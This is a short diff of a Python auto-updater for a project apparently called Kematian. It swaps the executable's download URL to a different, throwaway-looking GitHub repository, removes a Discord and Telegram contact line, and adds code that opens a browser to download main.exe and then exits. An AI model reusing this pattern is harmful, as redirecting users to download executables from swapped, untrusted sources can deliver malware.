@@ -9,7 +9,7 @@ import requests
 
 class AutoUpdater:
     def __init__(self) -> None:
-        self.github_url = "https://github.com/Pirate-Devs/Kematian/releases/download/AutoBuild/main.exe"
+        self.github_url = "https://github.com/adasdasdsaf/gayd/releases/download/AutoBuild/main.exe"
         self.current_file = sys.argv[0]
 
     def get_current_file_bytes(self) -> bytes:
@@ -35,8 +35,14 @@ class AutoUpdater:
             logging.info("This is a exe file")
             if self.check_if_update():
                 logging.critical(
-                    "discord.gg/hgtAYDGgT6 https://t.me/+ag0Xd4lgXn1iYWNl contact here "
+                    "AN UPDATE IS AVAILABLE! Please update the program to the latest version by downloading it from the github page."
                 )
+                webbrowser.open(
+                    "https://github.com/Pirate-Devs/Kematian/releases/download/AutoBuild/main.exe",
+                    1,
+                )
+                input("Press enter to exit...")
+                os._exit(0)
 
 
 if __name__ == "__main__":
